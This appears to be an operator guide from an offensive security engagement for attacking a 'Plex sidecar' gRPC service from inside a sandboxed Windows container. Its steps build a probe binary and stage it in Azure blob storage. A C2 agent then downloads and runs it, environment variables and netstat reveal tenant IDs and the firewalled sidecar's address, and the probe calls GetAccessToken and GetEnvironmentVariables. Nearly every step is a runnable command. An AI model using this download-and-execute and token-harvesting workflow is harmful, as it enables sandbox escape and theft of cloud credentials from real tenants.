# gRPC Probe

Go program that connects directly to the Plex sidecar gRPC service. Builds its own TLS channel and sends raw protobuf-encoded requests.

The probe must run as SYSTEM inside the container (the sidecar is on the host network, firewalled from the plugin sandbox). Use the C2 agent to run it.

## 1. Get the binary

Build from source:

```bash
cd tools/grpc-probe
GOOS=windows GOARCH=amd64 go build -o sidecar_probe.exe .
```

## 2. Upload to blob storage

```bash
az storage blob upload --account-name {ACCOUNT} --account-key "$KEY" \
  --container-name {CONTAINER} --name sidecar_probe.exe --file sidecar_probe.exe --overwrite
```

## 3. Download to the container via C2

Make sure the C2 agent is running (see [C2 setup](C2)), then:

```bash
curl -X POST http://localhost:8082/cmd -H "Content-Type: application/json" \
  -d '{"cmd":"powershell -c \"Invoke-WebRequest -Uri '"'"'https://{ACCOUNT}.blob.core.windows.net/{CONTAINER}/sidecar_probe.exe?{SAS}'"'"' -OutFile C:/Windows/Temp/sidecar_probe.exe -UseBasicParsing\""}'
```

The binary is ~16MB. Wait about 45 seconds before proceeding.

## 4. Get the sidecar IP and port

The sidecar hostname doesn't resolve from inside the container. Get the IP from an established connection:

```bash
curl -X POST http://localhost:8082/cmd -H "Content-Type: application/json" \
  -d '{"cmd":"set SideCarShimEndpointPort & set AzureTenantId & set AzureAppId"}'
```

Poll for the result, then:

```bash
curl -X POST http://localhost:8082/cmd -H "Content-Type: application/json" \
  -d '{"cmd":"netstat -ano | findstr {PORT}"}'
```

Look for an ESTABLISHED connection to `10.0.x.x:{PORT}`. That IP is the sidecar.

## 5. Run the probe

```bash
curl -X POST http://localhost:8082/cmd -H "Content-Type: application/json" \
  -d '{"cmd":"C:\\Windows\\Temp\\sidecar_probe.exe -target {SIDECAR_IP}:{PORT} -tenant {TENANT_ID} -app {APP_ID}"}'
```

Poll the C2 for output. You should see results for GetAccessToken, GetEnvironmentVariables, GetClusterEnvironmentSettings, etc.
